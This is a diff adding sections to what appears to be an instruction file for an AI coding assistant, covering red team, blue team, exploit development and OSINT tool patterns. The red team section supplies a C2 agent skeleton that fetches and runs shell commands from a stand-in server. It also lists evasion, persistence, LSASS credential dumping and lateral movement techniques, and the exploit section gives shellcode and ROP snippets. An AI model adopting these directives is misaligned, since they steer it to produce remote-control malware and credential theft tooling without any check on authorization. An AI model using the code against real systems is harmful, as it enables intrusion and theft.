@@ -1564,6 +1564,204 @@ When the user mentions CTF, capture the flag, or a specific CTF challenge:
 - Test the solve script against the challenge if possible
 - Include commented-out alternative approaches
 
+## RED TEAM TOOL PATTERNS (#4)
+
+When building red team / offensive operation tools:
+
+### C2 Frameworks
+- **Architecture:** Teamserver (Python/Go) + Agent (Python/C/C#) + Client (Python CLI or web UI)
+- **Comms:** HTTPS with domain fronting, DNS tunnelling, or WebSocket channels
+- **Agent features:** sleep/jitter, task queue, file upload/download, screenshot, keylog, shell exec
+- **Evasion:** in-memory execution, process injection, AMSI bypass, ETW patching
+- **Encryption:** AES-256-CBC or ChaCha20 for all C2 traffic, certificate pinning
+- **Example agent skeleton:**
+  ```python
+  import requests, time, base64, subprocess
+  from Crypto.Cipher import AES
+  C2_URL = "https://your-c2.com"
+  SLEEP = 5; JITTER = 2
+  while True:
+      task = requests.get(f"{C2_URL}/task", headers={"X-Auth": AGENT_ID}).json()
+      if task: result = subprocess.run(task["cmd"], shell=True, capture_output=True)
+      time.sleep(SLEEP + random.randint(0, JITTER))
+  ```
+
+### Payload Stagers
+- **Staged payloads:** small stager downloads and executes full payload in memory
+- **Formats:** Python, PowerShell, VBA macro, HTA, JS, batch, ELF, PE
+- **Delivery:** email attachment, USB drop, watering hole, supply chain
+- **In-memory execution:** use `ctypes` (Windows) or `mmap`+`mprotect` (Linux) to execute shellcode
+
+### Persistence Mechanisms
+- **Windows:** Registry Run keys, Scheduled Tasks, WMI subscriptions, DLL hijacking, service installation
+- **Linux:** crontab, systemd service, .bashrc/.profile, LD_PRELOAD, init.d
+- **macOS:** LaunchAgent/LaunchDaemon plist, login items, cron
+
+### Lateral Movement
+- Use `impacket` for: PsExec, WMIExec, SMBExec, DCOMExec, Pass-the-Hash, Pass-the-Ticket
+- SSH pivoting with `paramiko`
+- Port forwarding and SOCKS proxy via `chisel` or custom Python
+
+### Credential Dumping
+- **Windows:** LSASS dump (MiniDumpWriteDump via ctypes), SAM/SYSTEM hive extraction, DPAPI decryption
+- **Linux:** /etc/shadow, memory scraping, SSH key theft, browser credential extraction
+- **Active Directory:** DCSync via impacket secretsdump, Kerberoasting, AS-REP roasting
+
+### OPSEC Considerations
+- Always add sleep/jitter to C2 beacons
+- Use legitimate-looking User-Agent strings
+- Implement domain fronting or CDN-based C2
+- Add anti-analysis checks (VM detection, sandbox detection, debugger detection)
+- Clean up artefacts: logs, temp files, registry keys
+
+## BLUE TEAM / SOC TOOL PATTERNS (#5)
+
+When building defensive, detection, or monitoring tools:
+
+### SIEM Integration
+- **Splunk:** use `splunk-sdk` for search, alert creation, and data ingestion
+- **Elastic:** use `elasticsearch-py` for index queries and document ingestion
+- **QRadar:** REST API via `requests`
+- **Generic:** CEF/LEEF/JSON log formats, syslog forwarding
+
+### IOC Extractors
+- Extract: IP addresses, domains, URLs, file hashes (MD5/SHA1/SHA256), CVE IDs, email addresses
+- Use regex patterns + `iocextract` library
+- Enrich with VirusTotal, AbuseIPDB, Shodan APIs
+- Output: STIX 2.1 format using `stix2` library
+
+### YARA Rule Generator
+- Analyse sample → extract: strings, byte patterns, PE sections, imports, entropy
+- Generate YARA rule with: meta, strings, condition sections
+- Test rule with `yara-python` against sample and clean files
+- Include: wide/nocase modifiers, PE module conditions
+
+### Sigma Rule Templates
+- Map detection to Sigma format: title, status, description, references, logsource, detection, falsepositives, level
+- Convert to: Splunk SPL, Elastic KQL, QRadar AQL using `sigma` Python library
+- Include: timeframe, aggregation conditions
+
+### Log Parsers
+- Parse: Windows Event Logs (via `python-evtx`), Syslog, Apache/Nginx access logs, firewall logs
+- Detect: brute force, lateral movement, privilege escalation, data exfiltration patterns
+- Alert on: anomalous login times, impossible travel, new admin accounts
+
+### Threat Hunting
+- Build hunting queries for: PowerShell execution, LOLBAS abuse, credential access, network anomalies
+- Use `pandas` for log analysis and anomaly detection
+- Visualise with `matplotlib` or `plotly`
+
+## EXPLOIT DEVELOPMENT PATTERNS (#6)
+
+When building exploits or exploit development tools:
+
+### Buffer Overflow (Stack-based)
+```python
+from pwn import *
+# 1. Find offset
+pattern = cyclic(200)
+# 2. Control EIP/RIP
+payload = b"A" * offset + p64(ret_addr)
+# 3. Shellcode or ROP chain
+payload += shellcraft.sh()  # or rop_chain
+```
+
+### ROP Chain Builder
+```python
+from pwn import *
+from ropper import RopperService
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+rop = ROP(elf)
+# Find gadgets: pop rdi; ret, pop rsi; ret, etc.
+rop.call('system', [next(elf.search(b'/bin/sh\x00'))])
+```
+
+### Format String Exploitation
+```python
+# Read arbitrary memory: %7$s (read 7th arg as string)
+# Write arbitrary value: %<value>c%<n>$n
+# Leak stack: %p.%p.%p.%p
+# Leak libc: find __libc_start_main in GOT, leak via %s
+```
+
+### Heap Exploitation
+- **Techniques:** use-after-free, double free, heap spray, tcache poisoning, fastbin attack
+- Use `pwntools` heap utilities
+- Include: glibc version detection, tcache/fastbin/smallbin analysis
+
+### Shellcode Development
+```python
+from pwn import *
+context.arch = 'amd64'
+# execve('/bin/sh', NULL, NULL)
+shellcode = asm(shellcraft.sh())
+# Or custom:
+shellcode = asm('''
+    xor rdi, rdi
+    push rdi
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 59
+    syscall
+''')
+```
+
+### Architecture-Aware Defaults
+- Always check: `file binary` and `checksec binary` first
+- Adapt to: x86 (32-bit), x64 (64-bit), ARM, MIPS
+- Handle protections: NX (use ROP), ASLR (leak addresses), Stack Canary (leak/bypass), PIE (leak base)
+
+## OSINT TOOL PATTERNS (#7)
+
+When building OSINT or reconnaissance tools:
+
+### Domain/IP Reconnaissance
+```python
+import shodan, dns.resolver, whois
+# Shodan lookup
+api = shodan.Shodan(SHODAN_API_KEY)
+results = api.search(f'hostname:{domain}')
+# DNS enumeration
+for record_type in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
+    answers = dns.resolver.resolve(domain, record_type)
+# Subdomain brute force
+for sub in wordlist:
+    try: dns.resolver.resolve(f'{sub}.{domain}', 'A')
+```
+
+### Certificate Transparency
+- Query crt.sh API: `https://crt.sh/?q=%.{domain}&output=json`
+- Extract subdomains from certificate SANs
+- Find expired/revoked certs for historical infrastructure
+
+### Social Media & People OSINT
+- Username enumeration across platforms (Sherlock-style)
+- LinkedIn scraping with `selenium`
+- Twitter/X API for account history
+- Email breach checking via HaveIBeenPwned API
+
+### Google Dorking Automation
+```python
+# site:target.com filetype:pdf
+# site:target.com inurl:admin
+# site:target.com intitle:"index of"
+# "@target.com" filetype:xls
+```
+
+### VirusTotal Integration
+```python
+import vt
+client = vt.Client(VT_API_KEY)
+file_report = client.get_object(f'/files/{sha256_hash}')
+domain_report = client.get_object(f'/domains/{domain}')
+```
+
+### Maltego-Compatible Output
+- Output findings as CSV or JSON compatible with Maltego import
+- Structure: entity type, value, properties
+
 ## MOBILE APP BUILDS (iOS / Android)
 
 When a user asks for an iOS app, Android app, or mobile app:
